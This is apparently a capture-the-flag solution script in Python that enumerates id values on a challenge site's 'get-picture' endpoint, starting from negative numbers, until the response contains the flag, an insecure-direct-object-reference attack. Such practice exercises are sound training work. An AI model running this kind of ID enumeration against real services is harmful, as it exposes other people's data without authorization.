import requests
from bs4 import BeautifulSoup

i=-10
flag = ""
while "flag" not in flag:
    r = requests.get(f"http://gabibbo_friend.challs.olicyber.it/get-picture?id={i}")
    flag = r.text
    i += 1

print(flag)